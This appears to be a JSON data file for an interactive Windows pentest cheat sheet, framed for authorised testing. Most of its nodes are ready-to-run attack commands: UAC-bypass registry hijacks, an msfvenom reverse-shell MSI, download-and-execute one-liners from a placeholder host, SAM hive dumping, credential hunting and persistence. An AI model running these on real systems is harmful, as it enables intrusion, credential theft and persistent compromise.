@@ -1,0 +1,326 @@
+{
+  "schemaVersion": 1,
+  "title": "Windows quick ops: local enumeration, UAC bypass, privilege escalation, LOLBAS and persistence",
+  "intro": "A grab-bag reference for working a Windows foothold: enumerate the host and your own context, bypass UAC from a medium-integrity shell, hunt the usual local privilege-escalation paths, live off the land with signed built-in binaries, and establish persistence. Open any node for what it means and the commands behind it. Everything here is for systems you are authorised to test: enumeration is quiet, but UAC bypasses, privilege escalation and persistence change the host and are logged, so stay inside scope and keep notes.",
+  "phases": [
+    {
+      "id": "enum",
+      "name": "Local enumeration",
+      "blurb": "Learn who you are, where you are and what is running before you touch anything. All of this is read-only and runs as a standard user.",
+      "nodes": [
+        {
+          "id": "en-whoami",
+          "label": "Your context (whoami)",
+          "console": true,
+          "detail": "Start with your own account: whoami /all dumps the username, SID, full group membership and, crucially, the token privileges held by the current process. Scan the privileges list for the ones that lead to escalation (SeImpersonatePrivilege, SeAssignPrimaryToken, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeLoadDriverPrivilege, SeTakeOwnership). whoami /priv alone prints just the privileges table; whoami /groups shows the integrity level (Mandatory Label) that tells you whether you are already elevated.",
+          "cmd": ["whoami", "whoami /all", "whoami /priv", "whoami /groups"]
+        },
+        {
+          "id": "en-system",
+          "label": "The host (systeminfo)",
+          "console": true,
+          "detail": "systeminfo prints the OS name, build, hotfixes, architecture and domain membership in one block. The OS build and installed hotfixes decide whether a kernel exploit applies; feed them to Watson or wes-ng (Windows Exploit Suggester) offline. hostname and the environment variables fill in the rest.",
+          "cmd": ["systeminfo", "hostname", "wmic qfe get Caption,Description,HotFixID,InstalledOn", "echo %USERDOMAIN% & echo %PROCESSOR_ARCHITECTURE%"]
+        },
+        {
+          "id": "en-users",
+          "label": "Users & groups (net)",
+          "console": true,
+          "detail": "net user lists local accounts; net user <name> shows one account's group memberships and flags; net localgroup lists local groups and net localgroup administrators names who is a local admin. On a domain-joined host, add /domain to query the DC instead (net user <name> /domain, net group \"Domain Admins\" /domain). Membership of Administrators, Backup Operators or Remote Management Users is worth noting.",
+          "cmd": ["net user", "net user administrator", "net localgroup", "net localgroup administrators", "net accounts"]
+        },
+        {
+          "id": "en-network",
+          "label": "Network (ipconfig / netstat)",
+          "console": true,
+          "detail": "ipconfig /all gives every interface, DNS server and the domain suffix (a lead to the AD domain). netstat -ano lists listening ports with the owning PID, which reveals services reachable only from the host itself, candidates for a pivot. arp -a and the routing table map neighbouring hosts; the hosts file sometimes hard-codes internal names.",
+          "cmd": ["ipconfig /all", "netstat -ano", "arp -a", "route print", "type C:\\Windows\\System32\\drivers\\etc\\hosts"]
+        },
+        {
+          "id": "en-processes",
+          "label": "Processes & services (tasklist)",
+          "console": true,
+          "detail": "tasklist /svc maps each process to the services it hosts, so you can spot AV/EDR, backup agents and third-party services running as SYSTEM. query user (or qwinsta) shows who else is logged on, which matters before anything noisy. sc query / sc qc <service> inspect a specific service; the Get-* PowerShell equivalents (Get-Process, Get-Service, Get-CimInstance Win32_Service) return objects you can filter.",
+          "cmd": ["tasklist /svc", "query user", "sc query", "Get-Process", "Get-CimInstance Win32_Service | Select Name,State,StartName,PathName"],
+          "children": [
+            { "id": "en-wmic", "label": "wmic & Get-* (deprecated note)", "detail": "wmic is the classic one-liner tool (wmic service get name,pathname,startmode; wmic product get name,version) but it is deprecated and removed from recent Windows 11 builds, so prefer the PowerShell CIM cmdlets (Get-CimInstance) which pull the same WMI data. Keep wmic in mind for older targets where PowerShell is constrained.", "cmd": ["wmic service get name,displayname,pathname,startmode", "wmic product get name,version", "Get-CimInstance Win32_Product | Select Name,Version"] }
+          ]
+        },
+        {
+          "id": "en-search",
+          "label": "Hunt for secrets",
+          "console": true,
+          "detail": "Credentials leak into files. Recurse the drive for passwords in config and script files, check the saved-credential store with cmdkey /list, read unattended-install files (Unattend.xml, sysprep.inf hold base64 or plaintext passwords), and grep the registry for autologon and VNC/PuTTY secrets. The PowerShell history file often holds a typed-out credential.",
+          "cmd": ["findstr /si password *.txt *.ini *.config *.xml", "cmdkey /list", "type C:\\Windows\\Panther\\Unattend.xml", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword", "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"]
+        }
+      ],
+      "next": { "label": "Proceed to UAC bypass", "to": "uac" }
+    },
+    {
+      "id": "uac",
+      "name": "UAC bypass",
+      "blurb": "User Account Control keeps an admin's shell at medium integrity until something is explicitly elevated. If your user is in the Administrators group but the shell is medium integrity, a UAC bypass lifts it to high integrity without a prompt.",
+      "nodes": [
+        {
+          "id": "uac-idea",
+          "label": "The medium-to-high integrity idea",
+          "detail": "UAC runs an administrator with a filtered (medium-integrity) token for everyday work and only grants the full (high-integrity) token when a user clicks the consent prompt. A UAC bypass gets high integrity with no prompt, and it only matters when your account is already a local admin: it is not a privilege escalation from a standard user, it is unlocking the admin rights you already hold. Confirm first with whoami /groups (look for a Medium Mandatory Level and membership of Administrators). Most bypasses abuse a trusted auto-elevating Windows binary that reads a writable registry key or loads a hijackable path, so AV and newer builds catch the well-known ones; check the Windows build against a bypass's known-good range.",
+          "cmd": ["whoami /groups"]
+        },
+        {
+          "id": "uac-fodhelper",
+          "label": "fodhelper",
+          "console": true,
+          "detail": "fodhelper.exe auto-elevates and reads HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command, a key under the current user (writable without admin) with no default handler. Plant your command there, set the DelegateExecute value empty, run fodhelper, and it launches your payload at high integrity. A classic and still widely demonstrated technique; patched builds and AV detect the registry change, so expect to adapt.",
+          "cmd": ["reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f", "reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /d \"cmd.exe /c C:\\Windows\\Temp\\rev.exe\" /f", "fodhelper.exe"]
+        },
+        {
+          "id": "uac-computerdefaults",
+          "label": "computerdefaults",
+          "console": true,
+          "detail": "computerdefaults.exe abuses the exact same ms-settings handler as fodhelper and auto-elevates the same way, so it is a drop-in alternative when fodhelper is blocked or monitored. Plant the same HKCU\\Software\\Classes\\ms-settings key, then run it. Clean up the registry key afterwards.",
+          "cmd": ["reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f", "reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /d \"C:\\Windows\\Temp\\rev.exe\" /f", "computerdefaults.exe", "reg delete \"HKCU\\Software\\Classes\\ms-settings\" /f"]
+        },
+        {
+          "id": "uac-eventvwr",
+          "label": "eventvwr",
+          "console": true,
+          "detail": "eventvwr.exe (Event Viewer) auto-elevates and, on older builds, launches mmc.exe via HKCU\\Software\\Classes\\mscfile\\shell\\open\\command, a per-user key it reads before the machine default. Plant your command there and run eventvwr. This one was fixed in later Windows 10 builds, so it is mainly useful on legacy targets.",
+          "cmd": ["reg add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /d \"C:\\Windows\\Temp\\rev.exe\" /f", "eventvwr.exe", "reg delete \"HKCU\\Software\\Classes\\mscfile\" /f"]
+        },
+        {
+          "id": "uac-sdclt",
+          "label": "sdclt",
+          "console": true,
+          "detail": "sdclt.exe (Backup and Restore) auto-elevates and, on some builds, re-invokes itself through HKCU\\Software\\Classes\\Folder or the App Paths key, both writable per-user. Point the hijacked key at your payload and run sdclt /KickOffElab (or sdclt alone). Build coverage varies, so verify the target build before relying on it.",
+          "cmd": ["reg add \"HKCU\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand\" /d \"C:\\Windows\\Temp\\rev.exe\" /f", "sdclt.exe"]
+        },
+        {
+          "id": "uac-tooling",
+          "label": "Automate it (UACME)",
+          "detail": "Rather than planting keys by hand, UACME (akagi) packages dozens of numbered bypass methods and picks the mechanics for you (akagi64.exe <method> <payload>). It is a research tool and heavily signatured by AV, so on a real engagement the manual registry route above is often stealthier than the known binary. Whichever you use, clean up the planted keys afterwards.",
+          "cmd": []
+        }
+      ],
+      "next": { "label": "Proceed to Privilege escalation", "to": "privesc" }
+    },
+    {
+      "id": "privesc",
+      "name": "Privilege escalation",
+      "blurb": "From a standard or medium-integrity shell to SYSTEM. Run an automated scanner first for breadth, then verify and exploit the specific path it flags.",
+      "nodes": [
+        {
+          "id": "pe-scanners",
+          "label": "Automated scanners",
+          "console": true,
+          "detail": "winPEAS enumerates everything (services, registry, tokens, files, scheduled tasks) and colour-codes the likely wins; run winPEASany.exe or the .bat. PowerUp (part of PowerSploit) focuses on misconfigurations and can auto-exploit some (Invoke-AllChecks). SharpUp is the C# port. Run one for breadth, then verify by hand, scanners flag theory, you confirm the exploit.",
+          "cmd": ["winPEASany.exe", "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"", "SharpUp.exe audit"]
+        },
+        {
+          "id": "pe-services",
+          "label": "Service misconfigurations",
+          "detail": "Windows services run with their own account (often SYSTEM), so a service you can influence is a route to SYSTEM. Three classic flaws, each in the services table below: an unquoted path with a space, weak permissions on the service itself, and weak permissions on the service binary or its folder.",
+          "children": [
+            {
+              "id": "pe-unquoted",
+              "label": "Unquoted service paths",
+              "console": true,
+              "detail": "If a service's ImagePath has a space and is not wrapped in quotes (C:\\Program Files\\Some App\\service.exe), Windows tries each space-delimited prefix with .exe appended: C:\\Program.exe, then C:\\Program Files\\Some.exe, and so on. Drop a malicious binary at the first path you can write to and the service runs it as its own account on restart. Find them with wmic/CIM, then check write access with icacls.",
+              "cmd": ["wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"", "icacls \"C:\\Program Files\"", "sc stop <service> & sc start <service>"]
+            },
+            {
+              "id": "pe-serviceperms",
+              "label": "Weak service permissions",
+              "console": true,
+              "detail": "If your user holds SERVICE_CHANGE_CONFIG on a service, you can rewrite its binPath to any command and it runs as the service account. Check the DACL with accesschk (SysInternals) or PowerUp, then repoint binPath and restart. obj= shows which account it runs as; a service set to LocalSystem is the prize.",
+              "cmd": ["accesschk.exe /accepteula -uwcqv <user> <service>", "sc qc <service>", "sc config <service> binPath= \"C:\\Windows\\Temp\\rev.exe\" obj= LocalSystem", "sc stop <service> & sc start <service>"]
+            },
+            {
+              "id": "pe-binaryperms",
+              "label": "Weak binary / folder permissions",
+              "console": true,
+              "detail": "Even with the service config locked down, if you can overwrite the service executable (or write into its directory for a DLL hijack), you control what runs. icacls on the binary shows (F) or (M) for your user or a group you are in (Everyone, Authenticated Users, BUILTIN\\Users). Replace the binary, restart the service.",
+              "cmd": ["icacls \"C:\\Program Files\\Some App\\service.exe\"", "copy /y rev.exe \"C:\\Program Files\\Some App\\service.exe\""]
+            }
+          ]
+        },
+        {
+          "id": "pe-alwaysinstall",
+          "label": "AlwaysInstallElevated",
+          "console": true,
+          "detail": "If both the HKLM and HKCU AlwaysInstallElevated registry values are set to 1, any .msi runs as SYSTEM, a policy meant to let standard users install approved software. Build a malicious MSI with msfvenom and run it with msiexec. Both keys must be 1, check both.",
+          "cmd": ["reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f msi -o evil.msi", "msiexec /quiet /qn /i C:\\Windows\\Temp\\evil.msi"]
+        },
+        {
+          "id": "pe-tokens",
+          "label": "Token privileges (potato attacks)",
+          "detail": "Service accounts and some tasks hold privileges a normal user never gets. SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege (common on IIS/MSSQL service accounts, and on nt authority\\network service) let you impersonate a token you can coax SYSTEM into handing you, the family of potato attacks. The useful token privileges are in the table below; check yours with whoami /priv.",
+          "children": [
+            { "id": "pe-potato", "label": "SeImpersonate -> potato", "console": true, "detail": "With SeImpersonatePrivilege, a potato tool tricks a SYSTEM process into authenticating to a listener you control, then impersonates the returned token to run a command as SYSTEM. PrintSpoofer abuses the print spooler and works on modern Windows 10/Server 2019 where the original RottenPotato no longer does; GodPotato and the Juicy/Rotten family cover other builds. Point it at your payload.", "cmd": ["whoami /priv", "PrintSpoofer64.exe -i -c cmd", "GodPotato.exe -cmd \"cmd /c whoami\"", "JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\rev.exe -t *"] },
+            { "id": "pe-sebackup", "label": "SeBackup / SeRestore", "console": true, "detail": "SeBackupPrivilege bypasses file DACLs for reading, so you can copy protected files: back up the SAM and SYSTEM hives, exfiltrate and dump offline, or read a file you otherwise could not. SeRestorePrivilege does the same for writing. reg save needs the privilege enabled in the token.", "cmd": ["whoami /priv", "reg save hklm\\sam C:\\Windows\\Temp\\sam.hive", "reg save hklm\\system C:\\Windows\\Temp\\system.hive"] }
+          ]
+        },
+        {
+          "id": "pe-kernel",
+          "label": "Missing patches / kernel exploits",
+          "console": true,
+          "detail": "An unpatched kernel is a last resort (it can crash the host) but sometimes the only way. Feed systeminfo output to Windows Exploit Suggester NG (wes-ng) offline to list candidate CVEs for the build and missing hotfixes, then match one to a compiled exploit. Prefer a stable, well-known local exploit over anything experimental on a production box.",
+          "cmd": ["systeminfo > sysinfo.txt", "wes.py sysinfo.txt -i \"Elevation of Privilege\" --exploits-only"]
+        }
+      ],
+      "next": { "label": "Proceed to LOLBAS", "to": "lolbas" }
+    },
+    {
+      "id": "lolbas",
+      "name": "LOLBAS & built-in binaries",
+      "blurb": "Living off the land: signed Microsoft binaries already on the host that download files, execute code or exfiltrate, so you bring no tooling and blend into normal activity. The LOLBAS project catalogues them all.",
+      "nodes": [
+        {
+          "id": "lb-download",
+          "label": "Download a file",
+          "console": true,
+          "detail": "Several trusted binaries pull a file from your HTTP server. certutil -urlcache -f fetches and saves (and -encode/-decode handles base64). bitsadmin and the PowerShell equivalents (Invoke-WebRequest / the WebClient) do the same. certutil is the most-signatured, so rotate between them. The binaries and their one-liners are in the LOLBAS table below.",
+          "cmd": ["certutil -urlcache -f http://HOST/rev.exe C:\\Windows\\Temp\\rev.exe", "bitsadmin /transfer job /download /priority normal http://HOST/rev.exe C:\\Windows\\Temp\\rev.exe", "powershell -c \"Invoke-WebRequest http://HOST/rev.exe -OutFile C:\\Windows\\Temp\\rev.exe\""]
+        },
+        {
+          "id": "lb-execute",
+          "label": "Execute code",
+          "console": true,
+          "detail": "Trusted binaries that run arbitrary code are the heart of application-whitelisting (AppLocker/WDAC) bypasses. regsvr32 runs a remote scriptlet (the Squiblydoo technique), rundll32 runs an exported DLL function, mshta runs an HTA, and InstallUtil / msbuild compile-and-run inline code. Each is a signed Microsoft binary, so an allow-list that trusts the signer trusts these.",
+          "cmd": ["regsvr32 /s /n /u /i:http://HOST/evil.sct scrobj.dll", "rundll32 C:\\Windows\\Temp\\evil.dll,EntryPoint", "mshta http://HOST/evil.hta", "InstallUtil.exe /logfile= /LogToConsole=false /U evil.dll"]
+        },
+        {
+          "id": "lb-recon",
+          "label": "Recon helpers",
+          "detail": "Plenty of built-ins are enumeration gold with no download: driverquery lists loaded drivers (a vulnerable-driver lead), fsutil and wmic/CIM map disks and shares, and net/nltest enumerate the domain. These leave almost no footprint because they are the same commands an admin runs daily. Keep them in the enumeration phase and reach for the LOLBAS table when you need download or execution.",
+          "cmd": []
+        }
+      ],
+      "next": { "label": "Proceed to Persistence", "to": "persist" }
+    },
+    {
+      "id": "persist",
+      "name": "Persistence",
+      "blurb": "Survive a reboot or a lost session. On an authorised test, record every persistence mechanism you add so it can be removed in the clean-up.",
+      "nodes": [
+        {
+          "id": "ps-runkeys",
+          "label": "Registry run keys",
+          "console": true,
+          "detail": "The Run and RunOnce keys launch a command at logon. HKCU keys fire for the current user with no admin needed; HKLM keys fire for every user and need admin. Add a value pointing at your payload. These are the most-monitored persistence spot (Autoruns, Sysmon), so they are noisy but reliable. The common persistence locations are in the table below.",
+          "cmd": ["reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Windows\\Temp\\rev.exe\" /f", "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\""]
+        },
+        {
+          "id": "ps-schtasks",
+          "label": "Scheduled tasks",
+          "console": true,
+          "detail": "schtasks creates a task that runs on a trigger: at logon, at a time, or on an interval. A task you create as admin can run as SYSTEM (/ru SYSTEM). Triggers like ONLOGON and ONIDLE are quieter than a fixed minute schedule. List and delete tasks with the same tool during clean-up.",
+          "cmd": ["schtasks /create /sc onlogon /tn \"Updater\" /tr \"C:\\Windows\\Temp\\rev.exe\" /ru SYSTEM /f", "schtasks /query /tn \"Updater\" /v /fo list", "schtasks /delete /tn \"Updater\" /f"]
+        },
+        {
+          "id": "ps-services",
+          "label": "New service",
+          "console": true,
+          "detail": "A service set to auto-start runs your binary as LocalSystem on every boot, needs admin to create. sc create with start= auto and obj= LocalSystem is the whole recipe. More durable than a run key but more visible in the service list, so name it plausibly and remember to delete it afterwards.",
+          "cmd": ["sc create UpdaterSvc binPath= \"C:\\Windows\\Temp\\rev.exe\" start= auto obj= LocalSystem", "sc start UpdaterSvc", "sc delete UpdaterSvc"]
+        },
+        {
+          "id": "ps-startup",
+          "label": "Startup folder",
+          "console": true,
+          "detail": "Anything in a Startup folder runs at logon with no registry change. The per-user folder needs no admin; the all-users folder (ProgramData) runs for everyone and needs admin. Drop a shortcut or script there. Simple, and sometimes overlooked by tooling that watches only the registry.",
+          "cmd": ["copy rev.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\rev.exe\"", "dir \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\""]
+        }
+      ],
+      "next": { "label": "Proceed to Defence evasion notes", "to": "evasion" }
+    },
+    {
+      "id": "evasion",
+      "name": "Defence evasion (reference)",
+      "blurb": "Brief, reference-only notes on the controls you will meet. Disabling a defence changes the host's security posture, so do it only with explicit written authorisation and record it for the remediation report.",
+      "nodes": [
+        {
+          "id": "ev-amsi",
+          "label": "AMSI",
+          "detail": "The Antimalware Scan Interface lets PowerShell, VBScript and .NET submit script content to the registered AV before it runs, so obfuscation alone does not hide a malicious script. In-memory AMSI bypasses patch amsi.dll's scan function or the AmsiInitialize context inside the current process, so no signature on disk; they are heavily signatured in turn, so public one-liners age quickly. This is reference-only: understand that AMSI is why a known script is caught, and that any bypass is an authorised-test action to log, not a default.",
+          "cmd": []
+        },
+        {
+          "id": "ev-defender",
+          "label": "Defender status & exclusions",
+          "console": true,
+          "detail": "Get-MpComputerStatus shows whether Defender real-time protection is on; Get-MpPreference lists the configured exclusion paths, extensions and processes. An existing exclusion folder is the clean place to stage tooling without tripping the scanner, no change to the host. Adding a new exclusion (Add-MpPreference -ExclusionPath) weakens protection and needs admin and explicit authorisation; prefer reading the existing exclusions over creating one.",
+          "cmd": ["Get-MpComputerStatus | Select RealTimeProtectionEnabled,AntivirusEnabled", "Get-MpPreference | Select ExclusionPath,ExclusionExtension,ExclusionProcess"]
+        },
+        {
+          "id": "ev-logging",
+          "label": "Logging awareness",
+          "detail": "Know what records your actions so the report is accurate: PowerShell script-block logging (Event ID 4104), process creation (4688, with command line if enabled), service installs (7045), and Sysmon if deployed. The goal on an authorised test is not to erase logs but to understand the footprint each technique leaves, so defenders can tune detection afterwards. Clearing event logs is destructive and out of scope unless the engagement explicitly calls for it.",
+          "cmd": []
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "id": "token-privs",
+      "title": "Abusable token privileges",
+      "intro": "The token privileges worth checking in whoami /priv, and what each one buys. Filter by privilege or effect.",
+      "columns": ["Privilege", "What it enables"],
+      "rows": [
+        ["SeImpersonatePrivilege", "Impersonate a client token after it authenticates to you: the potato family (PrintSpoofer, GodPotato) to SYSTEM"],
+        ["SeAssignPrimaryTokenPrivilege", "Assign a primary token to a new process; pairs with SeImpersonate for potato-style escalation"],
+        ["SeDebugPrivilege", "Open and read any process, including LSASS, to dump credentials or inject"],
+        ["SeBackupPrivilege", "Bypass file DACLs for reading: copy the SAM/SYSTEM hives and protected files"],
+        ["SeRestorePrivilege", "Bypass file DACLs for writing: overwrite protected files and services"],
+        ["SeTakeOwnershipPrivilege", "Take ownership of any securable object, then grant yourself access"],
+        ["SeLoadDriverPrivilege", "Load a kernel driver; a signed vulnerable driver (BYOVD) leads to kernel-level code"],
+        ["SeManageVolumePrivilege", "Low-level volume access that can be chained to full file read"]
+      ]
+    },
+    {
+      "id": "uac-methods",
+      "title": "UAC bypass techniques",
+      "intro": "Auto-elevating binaries and the per-user registry key each abuses. Usefulness depends on the Windows build, verify before relying on one. Filter by binary.",
+      "columns": ["Binary", "Hijacked key / mechanism", "Notes"],
+      "rows": [
+        ["fodhelper.exe", "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command", "Classic; empty DelegateExecute value; signatured on patched builds"],
+        ["computerdefaults.exe", "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command", "Drop-in alternative to fodhelper, same key"],
+        ["eventvwr.exe", "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command", "Fixed in later Windows 10 builds; legacy targets only"],
+        ["sdclt.exe", "HKCU\\Software\\Classes\\exefile\\shell\\runas\\command (App Paths varies)", "Build-dependent; verify first"],
+        ["slui.exe", "HKCU\\Software\\Classes\\exefile\\shell\\open\\command", "Alternative when ms-settings handlers are watched"]
+      ]
+    },
+    {
+      "id": "lolbas",
+      "title": "LOLBAS one-liners",
+      "intro": "Signed Microsoft binaries for downloading files and executing code off the land. The LOLBAS project is the full catalogue. Filter by binary or purpose.",
+      "columns": ["Binary", "Purpose", "Example"],
+      "rows": [
+        ["certutil.exe", "Download / base64", "certutil -urlcache -f http://HOST/f.exe out.exe"],
+        ["bitsadmin.exe", "Download (BITS job)", "bitsadmin /transfer j /download /priority normal http://HOST/f.exe out.exe"],
+        ["regsvr32.exe", "Execute remote scriptlet", "regsvr32 /s /n /u /i:http://HOST/e.sct scrobj.dll"],
+        ["rundll32.exe", "Execute DLL export", "rundll32 evil.dll,EntryPoint"],
+        ["mshta.exe", "Execute HTA / script", "mshta http://HOST/e.hta"],
+        ["msbuild.exe", "Compile-and-run inline C#", "msbuild evil.xml"],
+        ["installutil.exe", "Run code via installer hook", "InstallUtil.exe /logfile= /U evil.dll"],
+        ["wmic.exe", "Execute / query (deprecated)", "wmic process call create \"cmd /c ...\""]
+      ]
+    },
+    {
+      "id": "persist-locations",
+      "title": "Persistence locations",
+      "intro": "Where a payload can be anchored, and whether it needs admin. Record every one you add so it can be removed. Filter by location.",
+      "columns": ["Location", "Scope", "Admin needed"],
+      "rows": [
+        ["HKCU\\...\\CurrentVersion\\Run", "Current user, at logon", "No"],
+        ["HKLM\\...\\CurrentVersion\\Run", "All users, at logon", "Yes"],
+        ["Scheduled task (/ru SYSTEM)", "Trigger-based, as SYSTEM", "Yes for SYSTEM"],
+        ["New auto-start service (obj= LocalSystem)", "Every boot, as SYSTEM", "Yes"],
+        ["Per-user Startup folder", "Current user, at logon", "No"],
+        ["All-users Startup (ProgramData)", "All users, at logon", "Yes"],
+        ["HKLM\\...\\Winlogon Userinit / Shell", "At logon, every user", "Yes"]
+      ]
+    }
+  ]
+}
